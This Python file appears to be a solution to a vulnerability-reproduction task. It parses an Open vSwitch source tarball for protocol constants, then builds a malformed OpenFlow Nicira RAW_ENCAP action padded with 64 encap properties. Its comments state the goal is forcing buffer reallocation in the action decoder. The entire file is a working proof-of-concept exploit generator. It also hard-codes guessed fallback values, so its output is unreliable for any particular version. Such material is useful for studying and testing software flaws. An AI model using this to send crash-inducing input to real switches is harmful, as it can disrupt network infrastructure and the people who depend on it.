import tarfile
import re
import struct
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        nx_vendor_id = 0x00002320  # Fallback Nicira vendor ID.
        nx_raw_encap_subtype = None
        nx_action_raw_encap_size = None

        try:
            with tarfile.open(src_path, 'r:*') as tf:
                text_files = []
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    # Only look at likely text source files.
                    if not any(m.name.endswith(ext) for ext in ('.h', '.c', '.hpp', '.hh')):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    try:
                        text = data.decode('utf-8')
                    except UnicodeDecodeError:
                        text = data.decode('latin1', 'ignore')
                    text_files.append(text)

                # Extract NX_VENDOR_ID.
                for text in text_files:
                    m = re.search(r'#\s*define\s+NX_VENDOR_ID\s+([0-9A-Fa-fx]+)', text)
                    if m:
                        try:
                            nx_vendor_id = int(m.group(1), 0)
                            break
                        except ValueError:
                            continue

                # Remove comments for further parsing.
                no_comment_files = []
                for text in text_files:
                    no_block = re.sub(r'/\*.*?\*/', '', text, flags=re.S)
                    no_line = re.sub(r'//.*', '', no_block)
                    no_comment_files.append(no_line)

                # Extract NXAST_RAW_ENCAP value from enum nx_action_subtype.
                for text in no_comment_files:
                    if 'NXAST_RAW_ENCAP' not in text or 'enum nx_action_subtype' not in text:
                        continue
                    m = re.search(r'enum\s+nx_action_subtype\s*{([^}]+)};', text, re.S)
                    if not m:
                        continue
                    body = m.group(1)
                    enums = body.split(',')
                    last_val: Optional[int] = None
                    for enum_def in enums:
                        s = enum_def.strip()
                        if not s:
                            continue
                        m2 = re.match(r'([A-Za-z0-9_]+)\s*(?:=\s*([0-9A-Fa-fx]+))?$', s)
                        if not m2:
                            continue
                        name = m2.group(1)
                        val_str = m2.group(2)
                        if val_str is not None:
                            try:
                                val = int(val_str, 0)
                            except ValueError:
                                # If complex expression, skip.
                                continue
                        else:
                            if last_val is None:
                                val = 0
                            else:
                                val = last_val + 1
                        if name == 'NXAST_RAW_ENCAP':
                            nx_raw_encap_subtype = val
                            break
                        last_val = val
                    if nx_raw_encap_subtype is not None:
                        break

                # Extract sizeof(struct nx_action_raw_encap) from OFP_ASSERT or similar.
                for text in no_comment_files:
                    m = re.search(
                        r'sizeof\s*\(\s*struct\s+nx_action_raw_encap\s*\)\s*==\s*(\d+)',
                        text,
                    )
                    if m:
                        try:
                            nx_action_raw_encap_size = int(m.group(1))
                            break
                        except ValueError:
                            continue

        except Exception:
            # On any tar or parsing error, fall back to conservative defaults.
            pass

        # Fallbacks if parsing failed.
        if nx_raw_encap_subtype is None:
            # Common value for NXAST_RAW_ENCAP in many OVS versions; best-effort guess.
            nx_raw_encap_subtype = 43

        if nx_action_raw_encap_size is None or not (16 <= nx_action_raw_encap_size <= 128):
            # Typical size for nx_action_raw_encap (nx_header + few extra fields).
            nx_action_raw_encap_size = 24

        # Build a RAW_ENCAP action with many small ED properties to force ofpbuf growth.
        prop_hdr_size = 4  # Assume ED property header: class(2) + type(1) + len(1).
        prop_count = 64    # Many properties to likely trigger ofpbuf reallocation.

        encap_len = prop_hdr_size * prop_count
        total_len = nx_action_raw_encap_size + encap_len

        # Ensure action length is a multiple of 8 as required by OpenFlow.
        rem = total_len % 8
        if rem != 0:
            total_len += 8 - rem
            encap_len = total_len - nx_action_raw_encap_size
            prop_count = encap_len // prop_hdr_size

        if prop_count <= 0:
            # Fallback minimal but valid action if something went wrong.
            total_len = max(nx_action_raw_encap_size, 16)
            rem = total_len % 8
            if rem != 0:
                total_len += 8 - rem
            buf = bytearray(total_len)
            struct.pack_into('!H', buf, 0, 0xFFFF)  # OFPAT_VENDOR
            struct.pack_into('!H', buf, 2, total_len)
            struct.pack_into('!I', buf, 4, nx_vendor_id)
            struct.pack_into('!H', buf, 8, nx_raw_encap_subtype)
            return bytes(buf)

        buf = bytearray(total_len)

        # Nicira vendor action header (nx_action_header).
        struct.pack_into('!H', buf, 0, 0xFFFF)        # type: OFPAT_VENDOR.
        struct.pack_into('!H', buf, 2, total_len)     # len: total action length.
        struct.pack_into('!I', buf, 4, nx_vendor_id)  # vendor: NX_VENDOR_ID.
        struct.pack_into('!H', buf, 8, nx_raw_encap_subtype)  # subtype: NXAST_RAW_ENCAP.
        # Bytes 10..(nx_action_raw_encap_size-1) left as zero (pads, ethertype, etc.).

        # Encapsulation data: sequence of ED properties directly after the struct.
        offset = nx_action_raw_encap_size
        for i in range(prop_count):
            if offset + prop_hdr_size > total_len:
                break
            # Property class: arbitrary non-zero value.
            struct.pack_into('!H', buf, offset, 0x1234)
            # Property type: vary to avoid trivial rejection.
            buf[offset + 2] = (i * 3) & 0xFF
            # Property length: header-only for simplicity.
            buf[offset + 3] = prop_hdr_size
            offset += prop_hdr_size

        return bytes(buf)